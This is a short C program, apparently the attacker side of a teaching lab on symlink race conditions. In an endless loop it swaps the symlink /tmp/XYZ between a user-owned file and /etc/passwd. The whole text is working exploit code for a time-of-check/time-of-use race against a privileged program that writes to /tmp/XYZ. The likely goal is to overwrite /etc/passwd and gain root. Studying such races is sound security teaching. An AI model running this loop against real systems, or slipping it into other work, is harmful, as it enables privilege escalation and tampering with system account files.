#include <unistd.h>

int main()
{
   while(1) {
     unlink("/tmp/XYZ");
     symlink("/tmp/myfile", "/tmp/XYZ");
     usleep(1000);

     unlink("/tmp/XYZ");
     symlink("/etc/passwd", "/tmp/XYZ");
     usleep(1000);
   }

   return 0;
}
